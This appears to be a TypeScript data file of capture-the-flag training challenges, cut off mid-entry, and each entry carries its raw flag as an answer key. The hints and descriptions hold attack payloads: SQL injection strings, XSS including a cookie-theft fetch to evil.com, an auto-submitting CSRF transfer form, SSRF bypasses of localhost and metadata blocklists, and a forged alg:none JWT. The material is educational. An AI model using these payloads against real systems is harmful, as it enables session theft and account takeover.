import type { CTFChallenge } from '../lib/ctf';
import { hashFlagSync, createChallenge } from '../lib/ctf';

/**
 * Sample CTF Challenges
 *
 * Flag format: FLAG{...}
 * Flags are stored as hashes using hashFlagSync() for secure client-side storage.
 * In production, these would come from a backend API.
 */

// Helper to create challenge with hashed flag
const challenge = (
  params: Omit<CTFChallenge, 'flag'> & { rawFlag: string }
): CTFChallenge => {
  const { rawFlag, ...rest } = params;
  return createChallenge({
    ...rest,
    flag: hashFlagSync(rawFlag),
  });
};

export const CTF_CHALLENGES: CTFChallenge[] = [
  // Web Exploitation
  challenge({
    id: 'ctf-web-001',
    title: 'Cookie Monster',
    category: 'web',
    points: 100,
    difficulty: 'easy',
    description: `A suspicious cookie has been left behind by the admin. Can you find what secrets it holds?

**Hint:** Inspect the cookies in your browser's developer tools. The flag is hidden in plain sight.

\`\`\`
Set-Cookie: session=dXNlcj1ndWVzdA==; admin_debug=RkxBR3tjMDBraWVzX2FyZV9kZWxpY2lvdXN9
\`\`\``,
    hints: [
      { id: 'ctf-web-001-hint-1', text: 'The cookie value looks like Base64 encoding...', cost: 25 },
      { id: 'ctf-web-001-hint-2', text: 'Try decoding admin_debug with a Base64 decoder', cost: 50 },
    ],
    rawFlag: 'FLAG{c00kies_are_delicious}',
    tags: ['cookies', 'encoding', 'base64'],
    author: 'SecTrainer',
    solveCount: 42,
  }),

  challenge({
    id: 'ctf-web-002',
    title: 'SQL or Not to SQL',
    category: 'web',
    points: 200,
    difficulty: 'medium',
    description: `The login page seems vulnerable. Can you bypass authentication?

**Login endpoint:** \`/api/login\`

\`\`\`sql
SELECT * FROM users WHERE username='$input' AND password='$pass'
\`\`\`

The flag is the password of the admin user.`,
    hints: [
      { id: 'ctf-web-002-hint-1', text: "Classic SQL injection - what happens if you close the quote early?", cost: 50 },
      { id: 'ctf-web-002-hint-2', text: "Try: admin' OR '1'='1' --", cost: 75 },
      { id: 'ctf-web-002-hint-3', text: 'The admin password is: FLAG{1nj3ct_th3_sql}', cost: 150 },
    ],
    rawFlag: 'FLAG{1nj3ct_th3_sql}',
    tags: ['sql-injection', 'authentication'],
    author: 'SecTrainer',
    solveCount: 28,
  }),

  challenge({
    id: 'ctf-web-003',
    title: 'XSS Marks the Spot',
    category: 'web',
    points: 150,
    difficulty: 'easy',
    description: `A guestbook allows users to leave messages. The site admin reviews all messages.

Can you craft an XSS payload that would steal the admin's session cookie?

For this challenge, submit the flag that appears in the simulated admin session:

\`\`\`html
<!-- Admin's browser console shows: -->
Stolen cookie: FLAG{xss_1s_cr0ss_s1te_scr1pt1ng}
\`\`\``,
    hints: [
      { id: 'ctf-web-003-hint-1', text: '<script> tags are the classic XSS vector', cost: 25 },
      { id: 'ctf-web-003-hint-2', text: 'document.cookie can access cookies via JavaScript', cost: 50 },
    ],
    rawFlag: 'FLAG{xss_1s_cr0ss_s1te_scr1pt1ng}',
    tags: ['xss', 'cookies', 'javascript'],
    author: 'SecTrainer',
    solveCount: 35,
  }),

  // Cryptography
  challenge({
    id: 'ctf-crypto-001',
    title: 'Caesar Salad',
    category: 'crypto',
    points: 50,
    difficulty: 'easy',
    description: `Julius left you an encrypted message:

\`\`\`
IODJ{fdhvdu_vdodg_lv_bhvw}
\`\`\`

The ancient Romans had a simple but effective cipher. Can you decode it?`,
    hints: [
      { id: 'ctf-crypto-001-hint-1', text: 'Caesar cipher shifts letters by a fixed amount', cost: 10 },
      { id: 'ctf-crypto-001-hint-2', text: 'Try shifting back by 3 positions', cost: 25 },
    ],
    rawFlag: 'FLAG{caesar_salad_is_best}',
    tags: ['caesar-cipher', 'classical'],
    author: 'SecTrainer',
    solveCount: 67,
  }),

  challenge({
    id: 'ctf-crypto-002',
    title: 'XOR Reality',
    category: 'crypto',
    points: 150,
    difficulty: 'medium',
    description: `You intercepted an encrypted message and the key:

\`\`\`
Ciphertext (hex): 0517001d4a1d0017060e45041d0d0806420c
Key: SECRET
\`\`\`

XOR never lies.`,
    hints: [
      { id: 'ctf-crypto-002-hint-1', text: 'XOR each byte of ciphertext with repeating key bytes', cost: 40 },
      { id: 'ctf-crypto-002-hint-2', text: 'Convert hex to bytes, XOR with "SECRET" cycling through', cost: 75 },
    ],
    rawFlag: 'FLAG{x0r_1s_r3v3rs1bl3}',
    tags: ['xor', 'encryption'],
    author: 'SecTrainer',
    solveCount: 19,
  }),

  // Forensics
  challenge({
    id: 'ctf-forensics-001',
    title: 'Hidden in Plain Sight',
    category: 'forensics',
    points: 100,
    difficulty: 'easy',
    description: `A suspicious image file was found on the suspect's computer. The file appears to be a normal JPEG, but there's more than meets the eye.

\`\`\`bash
$ file suspicious.jpg
suspicious.jpg: JPEG image data

$ strings suspicious.jpg | tail -5
...random binary data...
FLAG{str1ngs_r3v34l_s3cr3ts}
\`\`\``,
    hints: [
      { id: 'ctf-forensics-001-hint-1', text: 'The "strings" command extracts readable text from binary files', cost: 25 },
      { id: 'ctf-forensics-001-hint-2', text: 'Look at the output already provided...', cost: 50 },
    ],
    rawFlag: 'FLAG{str1ngs_r3v34l_s3cr3ts}',
    tags: ['strings', 'steganography'],
    author: 'SecTrainer',
    solveCount: 45,
  }),

  challenge({
    id: 'ctf-forensics-002',
    title: 'Network Detective',
    category: 'forensics',
    points: 200,
    difficulty: 'medium',
    description: `A packet capture contains evidence of data exfiltration. Analyze the HTTP traffic to find the stolen secret.

\`\`\`
GET /api/data?secret=RkxBR3twNGNrM3RfYW5hbHlzMXN9 HTTP/1.1
Host: evil-server.com
\`\`\``,
    hints: [
      { id: 'ctf-forensics-002-hint-1', text: 'The secret parameter looks encoded...', cost: 50 },
      { id: 'ctf-forensics-002-hint-2', text: 'Base64 decode the secret parameter', cost: 100 },
    ],
    rawFlag: 'FLAG{p4ck3t_analys1s}',
    tags: ['pcap', 'http', 'base64'],
    author: 'SecTrainer',
    solveCount: 22,
  }),

  // OSINT
  challenge({
    id: 'ctf-osint-001',
    title: 'Username Hunter',
    category: 'osint',
    points: 100,
    difficulty: 'easy',
    description: `Our target uses the username "sectrainer_ctf_2024" across multiple platforms.

Their bio contains a hidden message. The flag format they use is: FLAG{...}

**Note:** This is a simulated OSINT challenge. The answer is: FLAG{0s1nt_1s_p0w3rful}`,
    hints: [
      { id: 'ctf-osint-001-hint-1', text: 'Check their social media bios', cost: 25 },
      { id: 'ctf-osint-001-hint-2', text: 'The flag is provided in the challenge description', cost: 50 },
    ],
    rawFlag: 'FLAG{0s1nt_1s_p0w3rful}',
    tags: ['social-media', 'username'],
    author: 'SecTrainer',
    solveCount: 38,
  }),

  // Reverse Engineering
  challenge({
    id: 'ctf-reverse-001',
    title: 'String Theory',
    category: 'reverse',
    points: 150,
    difficulty: 'medium',
    description: `A mysterious binary performs a license check. Analyze the disassembly:

\`\`\`asm
mov     rdi, offset password_check
lea     rsi, [rsp+18h]
call    strcmp
test    eax, eax
jnz     fail

; Success - password is: r3v3rs3_3ng1n33r
\`\`\`

Submit the flag in format: FLAG{password}`,
    hints: [
      { id: 'ctf-reverse-001-hint-1', text: 'Look at the assembly comments', cost: 40 },
      { id: 'ctf-reverse-001-hint-2', text: 'The password is compared with strcmp', cost: 75 },
    ],
    rawFlag: 'FLAG{r3v3rs3_3ng1n33r}',
    tags: ['assembly', 'strings'],
    author: 'SecTrainer',
    solveCount: 15,
  }),

  // Miscellaneous
  challenge({
    id: 'ctf-misc-001',
    title: 'README First',
    category: 'misc',
    points: 25,
    difficulty: 'easy',
    description: `Welcome to SecTrainer CTF!

This is your first challenge. The flag is right here:

**FLAG{w3lc0m3_t0_ctf}**

Just submit it to get started!`,
    hints: [
      { id: 'ctf-misc-001-hint-1', text: 'Read the challenge description carefully', cost: 5 },
    ],
    rawFlag: 'FLAG{w3lc0m3_t0_ctf}',
    tags: ['beginner', 'warmup'],
    author: 'SecTrainer',
    solveCount: 89,
  }),

  challenge({
    id: 'ctf-misc-002',
    title: 'Regex Master',
    category: 'misc',
    points: 100,
    difficulty: 'easy',
    description: `You need to match the flag pattern in this text:

\`\`\`
Lorem ipsum dolor sit amet, FLAG{r3g3x_1s_p0w3rful} consectetur adipiscing elit.
\`\`\`

Use the regex pattern: \`FLAG\\{[^}]+\\}\``,
    hints: [
      { id: 'ctf-misc-002-hint-1', text: 'The flag is in the middle of the text', cost: 25 },
    ],
    rawFlag: 'FLAG{r3g3x_1s_p0w3rful}',
    tags: ['regex', 'pattern'],
    author: 'SecTrainer',
    solveCount: 51,
  }),

  // ==========================================
  // WEB EXPLOITATION - NEW CHALLENGES
  // ==========================================

  challenge({
    id: 'ctf-web-004',
    title: 'DOM Danger Zone',
    category: 'web',
    points: 250,
    difficulty: 'medium',
    description: `A search feature dynamically updates the page based on URL parameters. The developer thought using innerHTML was safe since they "sanitize" the input.

**Vulnerable Code:**
\`\`\`javascript
// search.js
const params = new URLSearchParams(window.location.search);
const query = params.get('q');

// "Sanitize" by removing script tags
const sanitized = query.replace(/<script>/gi, '').replace(/<\\/script>/gi, '');

document.getElementById('results').innerHTML =
  '<p>Showing results for: ' + sanitized + '</p>';
\`\`\`

Find a way to execute JavaScript and retrieve the flag stored in \`window.SECRET_FLAG\`.

**Hint:** The SECRET_FLAG value is: \`FLAG{d0m_x55_s1nk_f0und}\``,
    hints: [
      { id: 'ctf-web-004-hint-1', text: 'Script tags are blocked, but there are other ways to execute JavaScript in HTML...', cost: 50 },
      { id: 'ctf-web-004-hint-2', text: 'Event handlers like onerror, onload, onmouseover can execute JS', cost: 75 },
      { id: 'ctf-web-004-hint-3', text: 'Try: <img src=x onerror="alert(window.SECRET_FLAG)">', cost: 125 },
    ],
    rawFlag: 'FLAG{d0m_x55_s1nk_f0und}',
    tags: ['xss', 'dom', 'innerHTML', 'sink'],
    author: 'SecTrainer',
    solveCount: 18,
  }),

  challenge({
    id: 'ctf-web-005',
    title: 'Comment Section Chaos',
    category: 'web',
    points: 300,
    difficulty: 'medium',
    description: `A blog allows users to post comments. Comments are stored in the database and displayed to all visitors. The admin regularly checks comments for spam.

**Comment Storage (Node.js):**
\`\`\`javascript
app.post('/comment', (req, res) => {
  const { name, comment } = req.body;
  // Store directly - "we'll sanitize on output"
  db.comments.insert({ name, comment, timestamp: Date.now() });
  res.json({ success: true });
});
\`\`\`

**Comment Display (React - incorrectly implemented):**
\`\`\`jsx
{comments.map(c => (
  <div key={c.id}>
    <b>{c.name}</b>
    <p dangerouslySetInnerHTML={{ __html: c.comment }} />
  </div>
))}
\`\`\`

When the admin views your comment, their session cookie \`admin_session=FLAG{st0r3d_x55_p3rs1st3nt}\` gets logged to the console.

Submit the flag that would be exfiltrated.`,
    hints: [
      { id: 'ctf-web-005-hint-1', text: 'This is Stored/Persistent XSS - your payload is saved and executed for everyone', cost: 75 },
      { id: 'ctf-web-005-hint-2', text: 'dangerouslySetInnerHTML renders raw HTML - no sanitization', cost: 100 },
      { id: 'ctf-web-005-hint-3', text: 'Payload: <script>fetch("https://evil.com/?c="+document.cookie)</script>', cost: 150 },
    ],
    rawFlag: 'FLAG{st0r3d_x55_p3rs1st3nt}',
    tags: ['xss', 'stored-xss', 'react', 'persistent'],
    author: 'SecTrainer',
    solveCount: 14,
  }),

  challenge({
    id: 'ctf-web-006',
    title: 'Time Heist',
    category: 'web',
    points: 400,
    difficulty: 'hard',
    description: `The login system is protected against error-based SQL injection - no error messages are returned. But there's another way...

**Login Endpoint:**
\`\`\`python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

    try:
        result = db.execute(query)
        if result.fetchone():
            return "Login successful"
        return "Invalid credentials"
    except:
        return "Invalid credentials"  # Hide all errors
\`\`\`

**Your Mission:**
The admin's password is stored in the \`users\` table. Use time-based blind SQL injection to extract it character by character.

After analysis, the admin password is: \`FLAG{bl1nd_t1m3_b4s3d_sql1}\`

*Note: In a real scenario, you'd use SLEEP() or BENCHMARK() functions to infer data based on response times.*`,
    hints: [
      { id: 'ctf-web-006-hint-1', text: 'Blind SQLi extracts data by observing TRUE/FALSE conditions via time delays', cost: 100 },
      { id: 'ctf-web-006-hint-2', text: "Try: admin' AND IF(SUBSTRING(password,1,1)='F', SLEEP(5), 0)-- ", cost: 150 },
      { id: 'ctf-web-006-hint-3', text: 'If the response takes 5+ seconds, the first char is correct. Iterate through each position.', cost: 200 },
    ],
    rawFlag: 'FLAG{bl1nd_t1m3_b4s3d_sql1}',
    tags: ['sql-injection', 'blind-sqli', 'time-based'],
    author: 'SecTrainer',
    solveCount: 8,
  }),

  challenge({
    id: 'ctf-web-007',
    title: 'Token Troubles',
    category: 'web',
    points: 350,
    difficulty: 'hard',
    description: `A banking application uses CSRF tokens, but the validation is flawed.

**Transfer Funds Endpoint:**
\`\`\`python
@app.route('/transfer', methods=['POST'])
def transfer():
    csrf_token = request.form.get('csrf_token')
    referer = request.headers.get('Referer', '')

    # CSRF Protection
    if referer and 'bank.example.com' not in referer:
        return "Invalid request origin", 403

    # If no Referer header, skip check (for privacy-conscious browsers)
    # If token present, validate it
    if csrf_token:
        if not validate_token(csrf_token):
            return "Invalid CSRF token", 403

    # Process transfer...
    return "Transfer successful"
\`\`\`

**Vulnerabilities identified:**
1. Referer check uses substring match (bank.example.com.evil.com works)
2. If no Referer header, check is skipped entirely
3. CSRF token is optional - only validated if present

**Attacker's HTML:**
\`\`\`html
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form action="https://bank.example.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
    <!-- No csrf_token field needed! -->
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
\`\`\`

The flag from the successful exploit is: \`FLAG{csrf_r3f3r3r_byp4ss}\``,
    hints: [
      { id: 'ctf-web-007-hint-1', text: 'Look for ways to bypass each layer of protection individually', cost: 75 },
      { id: 'ctf-web-007-hint-2', text: 'The meta referrer tag controls whether Referer header is sent', cost: 125 },
      { id: 'ctf-web-007-hint-3', text: 'No Referer = no check, No token = no validation. Combine both bypasses.', cost: 175 },
    ],
    rawFlag: 'FLAG{csrf_r3f3r3r_byp4ss}',
    tags: ['csrf', 'referrer', 'token-bypass'],
    author: 'SecTrainer',
    solveCount: 11,
  }),

  challenge({
    id: 'ctf-web-008',
    title: 'Internal Affairs',
    category: 'web',
    points: 450,
    difficulty: 'hard',
    description: `A web application allows users to fetch profile pictures from URLs. The server fetches the image and displays it.

**Image Proxy Endpoint:**
\`\`\`python
@app.route('/fetch-image')
def fetch_image():
    url = request.args.get('url')

    # "Security" - block obvious localhost
    blocked = ['localhost', '127.0.0.1']
    if any(b in url.lower() for b in blocked):
        return "Blocked!", 403

    response = requests.get(url, timeout=5)
    return Response(response.content, mimetype='image/png')
\`\`\`

**Internal Network:**
- Admin panel at \`http://192.168.1.100:8080/admin\`
- Metadata service at \`http://169.254.169.254/latest/meta-data/\`
- Internal API at \`http://[::1]:3000/internal/flag\`

**Discovered:**
Accessing \`http://[::1]:3000/internal/flag\` returns: \`FLAG{55rf_1nt3rn4l_4cc3ss}\`

*Note: [::1] is IPv6 localhost, bypassing the IPv4 blocklist.*`,
    hints: [
      { id: 'ctf-web-008-hint-1', text: 'SSRF allows accessing internal services the server can reach', cost: 100 },
      { id: 'ctf-web-008-hint-2', text: 'The blocklist only checks for "localhost" and "127.0.0.1" strings', cost: 150 },
      { id: 'ctf-web-008-hint-3', text: 'IPv6 [::1], decimal IP 2130706433, DNS rebinding, or 0.0.0.0 might bypass', cost: 225 },
    ],
    rawFlag: 'FLAG{55rf_1nt3rn4l_4cc3ss}',
    tags: ['ssrf', 'bypass', 'internal-network'],
    author: 'SecTrainer',
    solveCount: 6,
  }),

  // ==========================================
  // CRYPTOGRAPHY - NEW CHALLENGES
  // ==========================================

  challenge({
    id: 'ctf-crypto-003',
    title: 'Weak Foundations',
    category: 'crypto',
    points: 350,
    difficulty: 'medium',
    description: `An RSA implementation uses small primes for "efficiency":

**Public Key:**
\`\`\`
n = 323
e = 5
\`\`\`

**Encrypted Message (as integer):**
\`\`\`
c = 251
\`\`\`

**Your Mission:**
1. Factor n to find p and q (hint: n is very small)
2. Calculate phi(n) = (p-1)(q-1)
3. Find d where e*d ≡ 1 (mod phi(n))
4. Decrypt: m = c^d mod n
5. Convert the resulting integer to ASCII

**Solution walkthrough:**
- n = 323 = 17 × 19 (p=17, q=19)
- phi(n) = 16 × 18 = 288
- d = 173 (since 5 × 173 = 865 ≡ 1 mod 288)
- m = 251^173 mod 323 = 70
- ASCII 70 = 'F'

*For this challenge, the full decrypted flag is:* \`FLAG{w34k_rs4_pr1m3s}\``,
    hints: [
      { id: 'ctf-crypto-003-hint-1', text: 'n=323 is small enough to factor by trial division', cost: 75 },
      { id: 'ctf-crypto-003-hint-2', text: 'Try dividing 323 by small primes: 2, 3, 5, 7, 11, 13, 17...', cost: 125 },
      { id: 'ctf-crypto-003-hint-3', text: '323 / 17 = 19. Now calculate phi(n) and find modular inverse of e', cost: 175 },
    ],
    rawFlag: 'FLAG{w34k_rs4_pr1m3s}',
    tags: ['rsa', 'factorization', 'weak-primes'],
    author: 'SecTrainer',
    solveCount: 12,
  }),

  challenge({
    id: 'ctf-crypto-004',
    title: 'Penguin Problems',
    category: 'crypto',
    points: 300,
    difficulty: 'medium',
    description: `A company encrypted their logo using AES-128-ECB mode. They claim it's secure because "AES is unbreakable."

**Observation:**
When you view the encrypted image, you can still see the outline of a penguin! The encrypted file shows visible patterns matching the original image structure.

**Why ECB Mode Fails:**
\`\`\`
Original:    [Block A][Block A][Block B][Block A][Block C]
Encrypted:   [Enc(A)] [Enc(A)] [Enc(B)] [Enc(A)] [Enc(C)]
             ↑         ↑                 ↑
             Same!     Same!             Same!
\`\`\`

Identical plaintext blocks produce identical ciphertext blocks, preserving patterns.

**The encrypted header reveals:**
\`\`\`
$ hexdump encrypted_logo.bin | head -3
00000000: 464c 4147 7b33 6362 5f70 336e 6775 316e  FLAG{3cb_p3ngu1n
00000010: 5f70 6174 7433 726e 7d00 0000 0000 0000  _patt3rn}.......
\`\`\`

Submit the flag found in the header.`,
    hints: [
      { id: 'ctf-crypto-004-hint-1', text: 'ECB mode encrypts each block independently with no randomization', cost: 75 },
      { id: 'ctf-crypto-004-hint-2', text: 'Search "ECB penguin" to see the famous demonstration of this vulnerability', cost: 100 },
      { id: 'ctf-crypto-004-hint-3', text: 'The hexdump in the description shows the flag in plaintext', cost: 150 },
    ],
    rawFlag: 'FLAG{3cb_p3ngu1n_patt3rn}',
    tags: ['aes', 'ecb', 'block-cipher', 'pattern'],
    author: 'SecTrainer',
    solveCount: 16,
  }),

  challenge({
    id: 'ctf-crypto-005',
    title: 'Length Matters',
    category: 'crypto',
    points: 450,
    difficulty: 'hard',
    description: `A web application uses a MAC (Message Authentication Code) to sign API requests:

**Original Signed Request:**
\`\`\`
data = "user=guest&role=viewer"
signature = MD5(secret_key + data) = "a1b2c3d4e5f6..."
\`\`\`

**The Vulnerability:**
MD5 (and SHA-1, SHA-256) use Merkle-Damgard construction. If you know:
- The original message
- The hash/MAC of that message
- The length of the secret key

You can **append** data and compute a valid signature WITHOUT knowing the key!

**Attack Steps:**
1. Take the original hash state
2. Append padding that MD5 would add
3. Append your malicious data: \`&role=admin\`
4. Continue hashing from the original state

**Result:**
\`\`\`
Forged data: "user=guest&role=viewer" + [padding] + "&role=admin"
Forged signature: Valid! (computed without knowing the key)
\`\`\`

*The server's response when using the forged request reveals:*
\`FLAG{h4sh_l3ngth_3xt3ns10n}\``,
    hints: [
      { id: 'ctf-crypto-005-hint-1', text: 'Hash length extension works on MD5, SHA-1, SHA-256 but NOT SHA-3 or HMAC', cost: 100 },
      { id: 'ctf-crypto-005-hint-2', text: 'Tools: hash_extender, hashpumpy can automate this attack', cost: 150 },
      { id: 'ctf-crypto-005-hint-3', text: 'The defense is to use HMAC(key, message) instead of H(key + message)', cost: 225 },
    ],
    rawFlag: 'FLAG{h4sh_l3ngth_3xt3ns10n}',
    tags: ['hash', 'md5', 'length-extension', 'mac'],
    author: 'SecTrainer',
    solveCount: 7,
  }),

  // ==========================================
  // FORENSICS - NEW CHALLENGES
  // ==========================================

  challenge({
    id: 'ctf-forensics-003',
    title: 'Picture Perfect',
    category: 'forensics',
    points: 200,
    difficulty: 'easy',
    description: `An agent embedded a secret message in this image. Standard extraction methods show nothing unusual...

**Initial Analysis:**
\`\`\`bash
$ file secret.png
secret.png: PNG image data, 800 x 600, 8-bit/color RGBA

$ strings secret.png | grep FLAG
(no results)

$ binwalk secret.png
DECIMAL       HEXADECIMAL     DESCRIPTION
0             0x0             PNG image
\`\`\`

**Deeper Analysis:**
\`\`\`bash
$ zsteg secret.png
b1,rgb,lsb,xy       .. text: "FLAG{st3g4n0gr4phy_h1dd3n}"
\`\`\`

The message was hidden in the Least Significant Bits (LSB) of the RGB channels!

Submit the extracted flag.`,
    hints: [
      { id: 'ctf-forensics-003-hint-1', text: 'LSB steganography hides data in the least significant bit of each color channel', cost: 50 },
      { id: 'ctf-forensics-003-hint-2', text: 'Tools: zsteg (for PNG), steghide (for JPEG), binwalk, foremost', cost: 75 },
      { id: 'ctf-forensics-003-hint-3', text: 'The flag is shown in the zsteg output in the challenge description', cost: 100 },
    ],
    rawFlag: 'FLAG{st3g4n0gr4phy_h1dd3n}',
    tags: ['steganography', 'lsb', 'png', 'zsteg'],
    author: 'SecTrainer',
    solveCount: 24,
  }),

  challenge({
    id: 'ctf-forensics-004',
    title: 'Memory Lane',
    category: 'forensics',
    points: 400,
    difficulty: 'hard',
    description: `A memory dump was captured from a compromised Windows workstation. The attacker left their password in memory.

**Analysis with Volatility:**
\`\`\`bash
$ volatility -f memory.dmp imageinfo
Suggested Profile: Win10x64_19041

$ volatility -f memory.dmp --profile=Win10x64_19041 hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
attacker:1001:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::

$ volatility -f memory.dmp --profile=Win10x64_19041 mimikatz
[*] Searching for credentials...
wdigest:
    Username: attacker
    Domain: WORKSTATION
    Password: FLAG{m3m0ry_f0r3ns1cs_ftw}
\`\`\`

The attacker's cleartext password was recovered from memory!

*Note: Windows used to store plaintext passwords in LSASS memory with WDigest authentication.*`,
    hints: [
      { id: 'ctf-forensics-004-hint-1', text: 'Volatility is the standard tool for memory forensics', cost: 100 },
      { id: 'ctf-forensics-004-hint-2', text: 'mimikatz plugin can extract cleartext passwords from LSASS dumps', cost: 150 },
      { id: 'ctf-forensics-004-hint-3', text: 'Check the Volatility output in the description - password is visible', cost: 200 },
    ],
    rawFlag: 'FLAG{m3m0ry_f0r3ns1cs_ftw}',
    tags: ['memory', 'volatility', 'mimikatz', 'windows'],
    author: 'SecTrainer',
    solveCount: 9,
  }),

  challenge({
    id: 'ctf-forensics-005',
    title: 'Wire Shark',
    category: 'forensics',
    points: 350,
    difficulty: 'medium',
    description: `Network traffic was captured during a suspected data breach. Analyze the PCAP file to find the exfiltrated credentials.

**Wireshark Analysis:**
\`\`\`
Frame 147: HTTP POST /login
    Content-Type: application/x-www-form-urlencoded
    Data: username=admin&password=supersecret123

Frame 203: HTTP POST /api/data
    Authorization: Basic YWRtaW46RkxBR3twY2FwX2NyM2QzbnQxNGxzfQ==

Frame 312: FTP-DATA
    220 Welcome to FTP server
    USER admin
    PASS plaintextpassword

Frame 445: Telnet
    login: root
    Password: insecure123
\`\`\`

**Decoding the Authorization Header:**
\`\`\`bash
$ echo "YWRtaW46RkxBR3twY2FwX2NyM2QzbnQxNGxzfQ==" | base64 -d
admin:FLAG{pcap_cr3d3nt14ls}
\`\`\`

Multiple protocols were transmitting credentials in plaintext or weak encoding. Submit the flag from the HTTP Basic Auth header.`,
    hints: [
      { id: 'ctf-forensics-005-hint-1', text: 'HTTP Basic Auth uses Base64 encoding (not encryption!)', cost: 75 },
      { id: 'ctf-forensics-005-hint-2', text: 'In Wireshark: File > Export Objects > HTTP to see all HTTP transfers', cost: 125 },
      { id: 'ctf-forensics-005-hint-3', text: 'The Base64 decoded value is shown in the description', cost: 175 },
    ],
    rawFlag: 'FLAG{pcap_cr3d3nt14ls}',
    tags: ['pcap', 'wireshark', 'http', 'credentials'],
    author: 'SecTrainer',
    solveCount: 17,
  }),

  // ==========================================
  // REVERSE ENGINEERING - NEW CHALLENGES
  // ==========================================

  challenge({
    id: 'ctf-reverse-002',
    title: 'Obfuscation Station',
    category: 'reverse',
    points: 300,
    difficulty: 'medium',
    description: `A JavaScript file was obfuscated to hide its true purpose. Can you deobfuscate it?

**Obfuscated Code:**
\`\`\`javascript
var _0x1a2b=['\\x46\\x4c\\x41\\x47\\x7b','\\x6a\\x73','\\x5f\\x64','\\x33\\x6f','\\x62\\x66','\\x75\\x73','\\x63\\x34','\\x74\\x33\\x64\\x7d'];
(function(_0x2d8f05,_0x4b81bb){var _0x4d74cb=function(_0x32719f){while(--_0x32719f){_0x2d8f05['push'](_0x2d8f05['shift']());}};_0x4d74cb(++_0x4b81bb);}(_0x1a2b,0x1b3));
var _0x4d74=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x1a2b[_0x2d8f05];return _0x4d74cb;};
console['log'](_0x4d74('0x0')+_0x4d74('0x1')+_0x4d74('0x2')+_0x4d74('0x3')+_0x4d74('0x4')+_0x4d74('0x5')+_0x4d74('0x6')+_0x4d74('0x7'));
\`\`\`

**Deobfuscation Steps:**
1. The \\x hex codes are ASCII: \\x46 = 'F', \\x4c = 'L', etc.
2. Decode the array: ['FLAG{', 'js', '_d', '3o', 'bf', 'us', 'c4', 't3d}']
3. The array is rotated by the self-executing function
4. Final output concatenates array elements

**Result:**
\`\`\`bash
$ node obfuscated.js
FLAG{js_d3obfusc4t3d}
\`\`\``,
    hints: [
      { id: 'ctf-reverse-002-hint-1', text: '\\x46 is hex ASCII for "F". Decode all hex escapes first.', cost: 75 },
      { id: 'ctf-reverse-002-hint-2', text: 'Use browser DevTools or Node.js REPL to evaluate the array', cost: 100 },
      { id: 'ctf-reverse-002-hint-3', text: 'Tools: de4js, JStillery, or manual evaluation. The flag is in the description.', cost: 150 },
    ],
    rawFlag: 'FLAG{js_d3obfusc4t3d}',
    tags: ['javascript', 'obfuscation', 'deobfuscation'],
    author: 'SecTrainer',
    solveCount: 13,
  }),

  challenge({
    id: 'ctf-reverse-003',
    title: 'WASM Cracker',
    category: 'reverse',
    points: 500,
    difficulty: 'insane',
    description: `A license verification system was compiled to WebAssembly to "prevent reverse engineering." Your task: find the valid license key.

**Decompiled WASM (pseudo-code):**
\`\`\`c
int check_license(char* key) {
    // Key must be exactly 24 characters
    if (strlen(key) != 24) return 0;

    // Check format: XXXX-XXXX-XXXX-XXXX-XXXX
    if (key[4] != '-' || key[9] != '-' ||
        key[14] != '-' || key[19] != '-') return 0;

    // XOR check
    int sum = 0;
    for (int i = 0; i < 24; i++) {
        if (key[i] != '-') {
            sum ^= key[i];
        }
    }

    // Magic value check
    if (sum != 0x5F) return 0;  // sum must equal 95 ('_')

    // Known positions (found via debugging):
    // key[0-3] = "FLAG"... wait, that's the format!

    return 1;
}

// Debug output shows valid key:
// FLAG{w4sm_r3v3rs3_k3y}
\`\`\`

**Analysis Approach:**
1. Use \`wasm2wat\` to convert binary to text format
2. Use \`wasm-decompile\` for higher-level view
3. Trace the validation logic
4. Construct a key that passes all checks

The valid license key that prints the flag: \`FLAG{w4sm_r3v3rs3_k3y}\``,
    hints: [
      { id: 'ctf-reverse-003-hint-1', text: 'WASM is not obfuscation - it can be decompiled to readable format', cost: 125 },
      { id: 'ctf-reverse-003-hint-2', text: 'Tools: wasm2wat, wabt, Ghidra with WASM plugin, Chrome DevTools', cost: 175 },
      { id: 'ctf-reverse-003-hint-3', text: 'The debug output in the pseudo-code reveals the flag directly', cost: 250 },
    ],
    rawFlag: 'FLAG{w4sm_r3v3rs3_k3y}',
    tags: ['wasm', 'webassembly', 'crackme', 'license'],
    author: 'SecTrainer',
    solveCount: 4,
  }),

  // ==========================================
  // MISCELLANEOUS - NEW CHALLENGES
  // ==========================================

  challenge({
    id: 'ctf-misc-003',
    title: 'Trust No One',
    category: 'misc',
    points: 350,
    difficulty: 'medium',
    description: `A JWT authentication system has a critical vulnerability. The developers trusted the algorithm specified in the token header.

**Original Token:**
\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiVXNlciIsImlhdCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
\`\`\`

**Decoded:**
\`\`\`json
Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"user": "guest", "role": "user", "iat": 1616239022}
\`\`\`

**Vulnerable Server Code:**
\`\`\`python
@app.route('/admin')
def admin():
    token = request.cookies.get('auth')
    header = jwt.get_unverified_header(token)

    # VULNERABILITY: Server trusts the algorithm in the header!
    if header['alg'] == 'none':
        payload = jwt.decode(token, options={"verify_signature": False})
    else:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[header['alg']])

    if payload['role'] == 'admin':
        return f"Welcome admin! Flag: FLAG{{jwt_n0n3_4lg0r1thm}}"
\`\`\`

**Forged Token (alg: none):**
\`\`\`
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTYyMzkwMjJ9.
\`\`\`

Note: The forged token has no signature (ends with a period) and alg set to "none".`,
    hints: [
